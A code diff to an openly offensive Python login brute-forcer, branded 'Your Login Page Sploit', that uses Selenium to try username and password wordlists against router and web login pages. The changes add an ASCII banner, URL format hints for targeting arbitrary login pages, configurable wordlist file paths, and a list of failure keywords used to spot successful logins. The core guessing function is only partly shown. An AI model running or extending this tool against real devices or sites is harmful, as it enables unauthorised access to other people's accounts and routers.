@@ -9,12 +9,33 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
-URL = input("Router's ip (default: 192.168.1.1): ") # Be sure about the router ip
+line1 = "__        _______ ____"
+line2 = "\ \      / /  ___/ ___| YOUR"
+line3 = " \ \ /\ / /| |_  \___ \ LOGIN"
+line4 = "  \ V  V / |  _|  ___) |PAGE"
+line5 = "   \_/\_/  |_|   |____/ SPLOIT"
+
+print(line1)
+print(line2)
+print(line3)
+print(line4)
+print(line5)
+
+usage = input("Show URL usage? y/n: ")
+if usage.lower() == "y":
+    print("Enter the login page URL, for example: https://site.com:1234/login-page/login.html ")
+    print("- The file depends on how the login page was created, simply look at the login page URL and see if it has a file name. If not, just don't put anything after the URL.")
+    print("- The port depends on whether the site supports HTTP or HTTPS. If it's on port 443, use HTTPS in the URL. If the site uses port 80, use HTTP in the URL. Or if the site has another service port, simply specify it in the URL.")
+    print("URL format: http/https://<url>:<port>/<directory>/<login-file>")
+else:
+    pass
+
+URL = input("Router's ip (default: http://192.168.1.1) : ") # Be sure about the router ip
 
 if not URL:
     URL = 'http://192.168.1.1'
 
-EXPRESSIONS = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"}
+EXPRESSIONS = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"} #you can add your own login page errors messages here
 
 def brute_with_selenium(username, password):
     options = Options()
@@ -65,8 +86,26 @@ def main():
     combinations_tested = 0
     use_selenium = False
 
-    usernames = [u.strip() for u in open("username.txt", "r").readlines()]
-    passwords = [p.strip() for p in open("password.txt", "r").readlines()]
+    while True:
+        usernames_file = input("Usernames file location (default: username.txt): ")
+        if not usernames_file:
+            usernames_file = "username.txt"
+        passwords_file = input("Passwords file location (default: password.txt): ")
+        if not passwords_file:
+            passwords_file = "password.txt"
+
+        try:
+            with open(usernames_file, "r") as user_file:
+                usernames = [u.strip() for u in user_file.readlines()]
+            with open(passwords_file, "r") as pass_file:
+                passwords = [p.strip() for p in pass_file.readlines()]
+            break
+        except FileNotFoundError:
+            print("One or both files not found. Please provide valid file locations.")
+        except PermissionError:
+            print("Permission denied. Please check file permissions and try again.")
+        except Exception as e:
+            print(f"An error occurred while loading files: {e}")
     total_combinations = len(usernames) * len(passwords)
 
     try:
